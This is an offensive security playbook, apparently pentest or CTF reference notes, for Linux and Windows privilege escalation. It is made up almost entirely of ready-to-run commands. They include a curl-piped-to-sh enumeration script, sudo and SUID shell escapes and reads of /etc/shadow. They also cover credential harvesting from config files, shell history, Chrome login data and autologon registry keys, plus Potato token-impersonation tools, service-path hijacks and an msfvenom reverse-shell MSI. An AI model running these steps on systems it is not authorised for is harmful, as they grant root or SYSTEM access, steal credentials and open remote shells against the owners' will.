# Playbook: Privilege Escalation

## Linux Privilege Escalation

### Step 1 — Automated Enumeration
```bash
# LinPEAS (comprehensive)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer and run: ./linpeas.sh | tee linpeas_output.txt

# LinEnum
./linenum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

### Step 2 — Manual Checks

#### Sudo
```bash
sudo -l
# Look for NOPASSWD entries, wildcards, env_keep
# Check GTFOBins: https://gtfobins.github.io/

# Common sudo escalations:
# sudo vim -c '!sh'
# sudo find / -exec /bin/sh \;
# sudo python3 -c 'import os; os.system("/bin/bash")'
# sudo env /bin/bash
# sudo awk 'BEGIN {system("/bin/bash")}'
# sudo less /etc/shadow → !bash
# sudo nmap --interactive → !sh (old nmap)
# sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

#### SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Cross-reference with GTFOBins
```

#### Capabilities
```bash
getcap -r / 2>/dev/null
# Dangerous caps: cap_setuid, cap_dac_override, cap_net_raw
# Example: python3 with cap_setuid → python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

#### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
# Look for writable scripts, wildcard injection, path hijacking
# pspy for monitoring processes: ./pspy64
```

#### Writable Files/Dirs
```bash
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null
ls -la /etc/passwd    # Writable? Add user with root UID
```

#### Kernel Exploits
```bash
uname -a
cat /etc/os-release
# Search: searchsploit linux kernel VERSION
# DirtyPipe (5.8-5.16.11), DirtyCoW (2.6.22-4.8.3), etc.
```

#### Passwords & Credentials
```bash
grep -rn "password\|passwd\|pass\|pwd" /var/www/ /home/ /opt/ /etc/ 2>/dev/null
cat /etc/shadow 2>/dev/null
find / -name "*.conf" -o -name "*.cfg" -o -name ".env" -o -name "wp-config.php" 2>/dev/null | xargs grep -il "pass" 2>/dev/null
history
cat ~/.bash_history
env | grep -i pass
```

#### NFS
```bash
cat /etc/exports
# no_root_squash? Mount and create SUID binary
```

#### PATH Hijacking
```bash
echo $PATH
# If a script calls a binary without full path, create malicious version in writable PATH dir
```

---

## Windows Privilege Escalation

### Step 1 — Automated Enumeration
```bash
# WinPEAS
.\winpeas.exe

# PowerUp
. .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all

# Windows Exploit Suggester
systeminfo > sysinfo.txt
# On attacker: windows-exploit-suggester.py --database DB --systeminfo sysinfo.txt
```

### Step 2 — Manual Checks

#### User & Group Info
```cmd
whoami /all
net user
net localgroup administrators
cmdkey /list                          # Saved credentials
```

#### Token Impersonation (Potato attacks)
```bash
# Check: whoami /priv
# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:
# → PrintSpoofer, JuicyPotato, GodPotato, SweetPotato, RoguePotato
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c COMMAND" -t *
```

#### Unquoted Service Paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# If path has spaces and no quotes, place binary at the first space
```

#### Weak Service Permissions
```cmd
# Check with accesschk.exe
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
# If SERVICE_ALL_ACCESS: sc config SERVICE binpath= "C:\path\to\payload.exe"
# sc stop SERVICE && sc start SERVICE
```

#### Weak Registry Permissions
```cmd
# Check service registry keys
# If writable: change ImagePath
reg query HKLM\SYSTEM\CurrentControlSet\Services\SERVICE
```

#### AlwaysInstallElevated
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi
# msiexec /quiet /qn /i evil.msi
```

#### Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
# Look for tasks running as SYSTEM with writable binaries
```

#### DLL Hijacking
```cmd
# Use Process Monitor to find missing DLLs
# Place malicious DLL in search path
```

#### Credential Hunting
```cmd
cmdkey /list                          # Saved creds → runas /savecred
dir /s /b C:\Users\*password* C:\Users\*pass* C:\Users\*.kdbx 2>nul
findstr /si "password" *.xml *.ini *.txt *.cfg *.config
type C:\Users\USER\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

#### Autologon Credentials
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```
